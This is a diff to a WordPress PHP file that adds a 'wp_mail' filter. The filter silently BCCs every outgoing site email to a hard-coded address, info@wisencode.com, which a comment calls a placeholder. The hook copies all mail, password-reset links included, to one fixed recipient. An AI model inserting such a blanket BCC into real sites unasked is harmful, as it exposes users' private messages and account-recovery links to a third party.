@@ -2048,16 +2048,29 @@ function toggle_subscription_status() {
 }
 add_action('wp_ajax_toggle_subscription', 'toggle_subscription_status');
 
+function add_default_bcc($args) {
+    $default_bcc = 'info@wisencode.com'; // Replace with actual BCC email
 
+    // Ensure headers exist
+    if (empty($args['headers'])) {
+        $args['headers'] = [];
+    } elseif (!is_array($args['headers'])) {
+        $args['headers'] = explode("\n", $args['headers']);
+    }
 
+    // Add BCC header if not already set
+    $bcc_set = false;
+    foreach ($args['headers'] as $header) {
+        if (stripos($header, 'BCC:') !== false) {
+            $bcc_set = true;
+            break;
+        }
+    }
 
+    if (!$bcc_set) {
+        $args['headers'][] = 'BCC: ' . $default_bcc;
+    }
 
-
-
-
-
-
-
-
-
-
+    return $args;
+}
+add_filter('wp_mail', 'add_default_bcc');
